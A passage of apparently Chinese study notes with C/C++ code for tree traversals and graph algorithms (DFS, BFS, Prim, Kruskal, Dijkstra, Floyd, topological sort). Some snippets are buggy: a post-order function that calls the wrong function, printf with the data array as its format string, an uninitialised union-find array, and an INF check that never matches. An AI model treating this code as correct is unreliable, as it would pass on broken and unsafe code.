<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InOrderTraverse</span><span class="params">(ware*S,BTnode*rootNode)</span></span><br><span class="line">&#123;</span><br><span class="line">	initWare(S);</span><br><span class="line">	BTnode*p=rootNode;</span><br><span class="line">	<span class="keyword">while</span>(p||S-&gt;top!=<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(p)</span><br><span class="line">		&#123;</span><br><span class="line">			push(S,p);</span><br><span class="line">			p=p-&gt;lchild;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;	p=S-&gt;data[S-&gt;top];</span><br><span class="line">			pop(S);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p-&gt;data);</span><br><span class="line">			p=p-&gt;rchild;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">binaryTreePostorderTraversal</span><span class="params">(node* head)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (head == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		binaryTreePrint(head-&gt;left);</span><br><span class="line">		binaryTreePrint(head-&gt;right);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, head-&gt;data);<span class="comment">//这一行在后面就是后序遍历</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrderTraverse</span><span class="params">(ware*S,BTnode*rootNode)</span></span><br><span class="line">&#123;</span><br><span class="line">	initWare(S);</span><br><span class="line">	push(S,rootNode);</span><br><span class="line">	<span class="keyword">while</span>(S-&gt;top!=<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		BTnode*p=S-&gt;data[S-&gt;top];</span><br><span class="line">		pop(S);</span><br><span class="line">		a[i++]=p-&gt;data;<span class="comment">//将弹出的元素存入数组，最后翻转输出即可</span></span><br><span class="line">		<span class="keyword">if</span>(p-&gt;lchild)	push(S,p-&gt;lchild);</span><br><span class="line">		<span class="keyword">if</span>(p-&gt;rchild)	push(S,p-&gt;rchild);</span><br><span class="line">	&#125;</span><br><span class="line">	reverse(a);</span><br><span class="line">	<span class="built_in">printf</span>(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">binaryTreeSequenceTraversal</span><span class="params">(node* head)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">queue</span>&lt;node*&gt; que;<span class="comment">//创建队列</span></span><br><span class="line">	<span class="keyword">if</span> (head != <span class="literal">NULL</span>) que.push(head);</span><br><span class="line">	<span class="keyword">while</span> (!que.empty())</span><br><span class="line">	&#123;</span><br><span class="line">		node* p = que.front();</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; p-&gt;data &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		que.pop();</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;left != <span class="literal">NULL</span>) que.push(p-&gt;left);</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;right != <span class="literal">NULL</span>) que.push(p-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h4><h4 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h4><p><strong>暂无</strong></p>
<hr>
<h3 id="图"><a href="#图" class="headerlink" title="图"></a>图</h3><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> SIZE = <span class="number">10</span>;<span class="comment">//表示邻接矩阵的大小</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF = <span class="number">99999</span>;<span class="comment">//表示机器的最大值</span></span><br></pre></td></tr></table></figure>

<h4 id="图的结构"><a href="#图的结构" class="headerlink" title="图的结构"></a>图的结构</h4><h5 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Graph</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> edge[SIZE][SIZE];</span><br><span class="line">	<span class="type">int</span> point[SIZE][SIZE];</span><br><span class="line">	<span class="type">int</span> numberPoint, numberEdge;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="图的创建"><a href="#图的创建" class="headerlink" title="图的创建"></a>图的创建</h4><h5 id="邻接矩阵-1"><a href="#邻接矩阵-1" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">graphCreate</span><span class="params">(Graph* G)</span><span class="comment">//创建无向有权图</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//输入提示信息</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;please input the number of points&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;please input the number of edges&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; G-&gt;numberPoint &gt;&gt; G-&gt;numberEdge;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;numberPoint; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; G-&gt;numberPoint; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			G-&gt;edge[i][j] = -INF;</span><br><span class="line">            <span class="comment">//将无边用负无穷表示</span></span><br><span class="line">            <span class="comment">//在之后的判断有无边中，可以减少代码量</span></span><br><span class="line">			<span class="keyword">if</span> (i == j) G-&gt;edge[i][j] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;numberEdge; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> vi, vj, weight;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;please input the information of this edge&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;eg: 0 3 1&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; vi &gt;&gt; vj &gt;&gt; weight;</span><br><span class="line">		</span><br><span class="line">		G-&gt;edge[vi][vj] = weight;</span><br><span class="line">		G-&gt;edge[vj][vi] = weight;</span><br><span class="line">	&#125;</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);<span class="comment">//清屏</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="图的打印"><a href="#图的打印" class="headerlink" title="图的打印"></a>图的打印</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">graphPrint</span><span class="params">(Graph* G)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;numberPoint; i++)</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&#x27;\t&#x27;</span> &lt;&lt; i;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;numberPoint; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; i;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; G-&gt;numberPoint; j++)</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&#x27;\t&#x27;</span> &lt;&lt; G-&gt;edge[i][j];</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h4><h5 id="DFS算法-深度优先算法"><a href="#DFS算法-深度优先算法" class="headerlink" title="DFS算法(深度优先算法)"></a>DFS算法(深度优先算法)</h5><h6 id="递归算法"><a href="#递归算法" class="headerlink" title="递归算法"></a>递归算法</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局变量</span></span><br><span class="line"><span class="type">bool</span> dist[MATRIX_SIZE]; <span class="comment">//用于记录节点是否访问过</span></span><br><span class="line"><span class="comment">//由于dist是全局数组，未初始化时，默认值为false</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">graphDFS</span><span class="params">(Graph*G, <span class="type">int</span> vertex)</span><span class="comment">//从顶点vertex开始遍历</span></span><br><span class="line">&#123;</span><br><span class="line">	dist[vertex] = <span class="literal">true</span>;<span class="comment">//标记该节点已访问过</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;正在访问节点&quot;</span> &lt;&lt; vertex &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;numberPoint; i++)</span><br><span class="line">		<span class="keyword">if</span> (dist[i] == <span class="literal">false</span> &amp;&amp; G-&gt;edge[vertex][i] &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">//判断下一个节点是否未访问过</span></span><br><span class="line">       		<span class="comment">//判断下一个节点与该节点是否有边链接</span></span><br><span class="line">			graphDFS(G, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="非递归算法"><a href="#非递归算法" class="headerlink" title="非递归算法"></a>非递归算法</h6><ul>
<li>代码和BFS算法类似</li>
<li>只不过是把队列换成了栈</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">graphDFS</span><span class="params">(Graph*G, <span class="type">int</span> vertex)</span><span class="comment">//从顶点vertex开始遍历</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">stack</span>&lt;<span class="type">int</span>&gt; st;	<span class="comment">//定义栈</span></span><br><span class="line">	<span class="type">bool</span> visit[SIZE] = &#123; <span class="literal">false</span> &#125;;</span><br><span class="line">	st.push(vertex);</span><br><span class="line">	visit[vertex] = <span class="literal">true</span>;<span class="comment">//标记该节点已访问过</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (!st.empty())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> k = st.top();</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;正在访问节点&quot;</span> &lt;&lt; k &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		st.pop();</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;numberPoint; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (visit[i] == <span class="literal">false</span> &amp;&amp; G-&gt;edge[k][i] &gt; <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				visit[i] = <span class="literal">true</span>;<span class="comment">//标记该节点已访问过</span></span><br><span class="line">				st.push(i);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="BFS算法-广度优先算法"><a href="#BFS算法-广度优先算法" class="headerlink" title="BFS算法(广度优先算法)"></a>BFS算法(广度优先算法)</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">graphBFS</span><span class="params">(Graph* G,<span class="type">int</span> vertex)</span><span class="comment">//从顶点vertex开始遍历</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">	<span class="built_in">queue</span>&lt;<span class="type">int</span>&gt; que;	<span class="comment">//定义队列</span></span><br><span class="line">	<span class="type">bool</span> visit[SIZE] = &#123; <span class="literal">false</span> &#125;;</span><br><span class="line">	que.push(vertex);</span><br><span class="line">	visit[vertex] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (!que.empty())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> k = que.front();</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;正在访问节点&quot;</span> &lt;&lt; k &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		que.pop();</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;numberPoint; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (G-&gt;edge[k][i] &gt; <span class="number">0</span> &amp;&amp; visit[i] == <span class="literal">false</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				visit[i] = <span class="literal">true</span>;</span><br><span class="line">				que.push(i);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h4><h5 id="Prim算法"><a href="#Prim算法" class="headerlink" title="Prim算法"></a>Prim算法</h5><h6 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h6><ul>
<li><strong>注意</strong></li>
</ul>
<ul>
<li></li>
</ul>
<h6 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">graphPrim</span><span class="params">(Graph* G)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> parent[SIZE];</span><br><span class="line">	<span class="type">int</span> lowcost[SIZE];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;numberPoint; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        parent[i] = i;</span><br><span class="line">		<span class="keyword">if</span> (G-&gt;edge[<span class="number">0</span>][i] &gt;= <span class="number">0</span>)</span><br><span class="line">			lowcost[i] = G-&gt;edge[<span class="number">0</span>][i];</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			lowcost[i] = -G-&gt;edge[<span class="number">0</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注意此处循环变量的初始值是1</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; G-&gt;numberPoint; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> minVertex = <span class="number">-1</span>;</span><br><span class="line">		<span class="type">int</span> minWeight = INF;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; G-&gt;numberPoint; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (lowcost[j] &gt; <span class="number">0</span> &amp;&amp; minWeight &gt; lowcost[j])</span><br><span class="line">			&#123;</span><br><span class="line">				minVertex = j;</span><br><span class="line">				minWeight = lowcost[j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; parent[minVertex] &lt;&lt; <span class="string">&quot; &lt;=&gt; &quot;</span> &lt;&lt; minVertex &lt;&lt; <span class="string">&#x27;\t&#x27;</span> &lt;&lt; minWeight &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		lowcost[minVertex] = <span class="number">0</span>;<span class="comment">//标记此顶点</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; G-&gt;numberPoint; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (G-&gt;edge[minVertex][j] &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(lowcost[j] &gt; G-&gt;edge[minVertex][j])</span><br><span class="line">                &#123;</span><br><span class="line">                    lowcost[j] = G-&gt;edge[minVertex][j];</span><br><span class="line">                    parent[j] = minVertex;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Kruskal算法"><a href="#Kruskal算法" class="headerlink" title="Kruskal算法"></a>Kruskal算法</h5><h6 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h6><ul>
<li>步骤 <ul>
<li>编写一个测试用例</li>
<li>定义边的结构体, 包含的开头和结尾, 还有边的权重</li>
<li>编写并查集的查找函数( disjointSetFind )</li>
<li>初始化并查集数组</li>
<li>初始化边集数组</li>
<li>对边集数组进行排序</li>
<li>将边集数组打印一下</li>
</ul>
</li>
<li>并查集的作用 <ul>
<li>用于判断该图是否成环</li>
</ul>
</li>
<li>注意事项 <ul>
<li>在初始化边集数组的时候 <ul>
<li>两个循环变量的初始值不相同</li>
</ul>
</li>
</ul>
</li>
</ul>
<h6 id="边的结构"><a href="#边的结构" class="headerlink" title="边的结构"></a>边的结构</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> begin;</span><br><span class="line">	<span class="type">int</span> weight;</span><br><span class="line">	<span class="type">int</span> end;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h6 id="并查集的查找"><a href="#并查集的查找" class="headerlink" title="并查集的查找"></a>并查集的查找</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">disjointSetFind</span><span class="params">(<span class="type">int</span> parent[], <span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> parent[x] == x ? x : disjointSetFind(parent, parent[x]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="核心算法"><a href="#核心算法" class="headerlink" title="核心算法"></a>核心算法</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">graphKruskal</span><span class="params">(Graph* G)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">	<span class="type">int</span> parent[SIZE];</span><br><span class="line">	<span class="built_in">vector</span>&lt;Edge&gt; vec;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;numberPoint; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; G-&gt;numberPoint; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (G-&gt;edge[i][j] &gt; <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				Edge temp;</span><br><span class="line">				temp.begin = i;</span><br><span class="line">				temp.end = j;</span><br><span class="line">				temp.weight = G-&gt;edge[i][j];</span><br><span class="line">				vec.push_back(temp);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将边根据权值大小按照从小到大的顺序排序</span></span><br><span class="line">	sort(vec.begin(), vec.end(), cmp);</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">auto</span> e : vec)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> n = disjointSetFind(parent, e.begin);</span><br><span class="line">		<span class="type">int</span> m = disjointSetFind(parent, e.end);</span><br><span class="line">		<span class="keyword">if</span> (n != m)</span><br><span class="line">		&#123;</span><br><span class="line">			parent[m] = n;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; e.begin &lt;&lt; <span class="string">&quot; &lt;=&gt; &quot;</span> &lt;&lt; e.end </span><br><span class="line">                &lt;&lt; <span class="string">&#x27;\t&#x27;</span> &lt;&lt; e.weight &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="最短路径问题"><a href="#最短路径问题" class="headerlink" title="最短路径问题"></a>最短路径问题</h4><h5 id="Dijkstra算法"><a href="#Dijkstra算法" class="headerlink" title="Dijkstra算法"></a>Dijkstra算法</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从图G的vertex顶点到其余顶点的最短路径</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">graphDijkstra</span><span class="params">(Graph* G, <span class="type">int</span> vertex)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> parent[SIZE];</span><br><span class="line">	<span class="type">int</span> lowpath[SIZE];</span><br><span class="line">	<span class="type">bool</span> visit[SIZE];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;numberPoint; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		parent[i] = vertex;</span><br><span class="line">		lowpath[i] = G-&gt;edge[vertex][i];</span><br><span class="line">		<span class="keyword">if</span> (lowpath[i] == -INF)</span><br><span class="line">			lowpath[i] *= <span class="number">-1</span>;</span><br><span class="line">		visit[i] = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	visit[vertex] = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//注意此时i的初始值是1 </span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; G-&gt;numberPoint; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> minVertex = <span class="number">-1</span>;</span><br><span class="line">		<span class="type">int</span> minWeight = INF;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; G-&gt;numberPoint; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (visit[j] == <span class="literal">false</span> &amp;&amp; minWeight &gt; lowpath[j])</span><br><span class="line">			&#123;</span><br><span class="line">				minWeight = lowpath[j];</span><br><span class="line">				minVertex = j;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		visit[minVertex] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; G-&gt;numberPoint; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (visit[j] == <span class="literal">false</span> &amp;&amp; G-&gt;edge[minVertex][j] &gt; <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (lowpath[j] &gt; minWeight + G-&gt;edge[minVertex][j])</span><br><span class="line">				&#123;</span><br><span class="line">					lowpath[j] = minWeight + G-&gt;edge[minVertex][j];</span><br><span class="line">					parent[j] = minVertex;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Floyd算法"><a href="#Floyd算法" class="headerlink" title="Floyd算法"></a>Floyd算法</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">graphFloyd</span><span class="params">(Graph* G)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">	<span class="type">int</span> lowpath[SIZE][SIZE];<span class="comment">//记录最短路径的权值和</span></span><br><span class="line">	<span class="type">int</span> parent[SIZE][SIZE];<span class="comment">//记录最短路径的路径</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;numberPoint; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; G-&gt;numberPoint; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			lowpath[i][j] = G-&gt;edge[i][j];</span><br><span class="line">			parent[i][j] = j;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; G-&gt;numberPoint; k++)			<span class="comment">//中间顶点</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;numberPoint; i++)		<span class="comment">//开始顶点</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; G-&gt;numberPoint; j++)	<span class="comment">//结尾顶点</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//经过中间顶点的路径比原来两点之间的路径更短</span></span><br><span class="line">				<span class="keyword">if</span> (lowpath[i][j] &gt; lowpath[i][k] + lowpath[k][j])</span><br><span class="line">				&#123;</span><br><span class="line">					lowpath[i][j] = lowpath[i][k] + lowpath[k][j];</span><br><span class="line">					parent[i][j] = parent[i][k];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="有向无环图"><a href="#有向无环图" class="headerlink" title="有向无环图"></a>有向无环图</h4><h5 id="拓扑排序-x3D-x3D-（未修改）-x3D-x3D"><a href="#拓扑排序-x3D-x3D-（未修改）-x3D-x3D" class="headerlink" title="拓扑排序&#x3D;&#x3D;（未修改）&#x3D;&#x3D;"></a>拓扑排序&#x3D;&#x3D;（未修改）&#x3D;&#x3D;</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">graphTopologySort</span><span class="params">(Graph* G)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> indegree[MATRIX_SIZE];</span><br><span class="line">	<span class="built_in">queue</span>&lt;<span class="type">int</span>&gt; que;</span><br><span class="line">	<span class="type">int</span> visit[MATRIX_SIZE];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;numberPoint; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		indegree[i] = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//visit[i] = false;</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; G-&gt;numberPoint; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (G-&gt;edge[j][i] != <span class="number">0</span> &amp;&amp; G-&gt;edge[j][i] != INF)</span><br><span class="line">				indegree[i] ++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (indegree[i] == <span class="number">0</span>)que.push(i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (!que.empty())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> temp = que.front();</span><br><span class="line">		que.pop();</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; temp &lt;&lt; <span class="string">&quot; =&gt; &quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G-&gt;numberPoint; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (G-&gt;edge[temp][i] != <span class="number">0</span> &amp;&amp; G-&gt;edge[temp][i] != INF)</span><br><span class="line">			&#123;</span><br><span class="line">				indegree[i] --;</span><br><span class="line">				<span class="comment">//注意点,一定要嵌套两重分支语句</span></span><br><span class="line">				<span class="keyword">if</span> (indegree[i] == <span class="number">0</span>)que.push(i);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

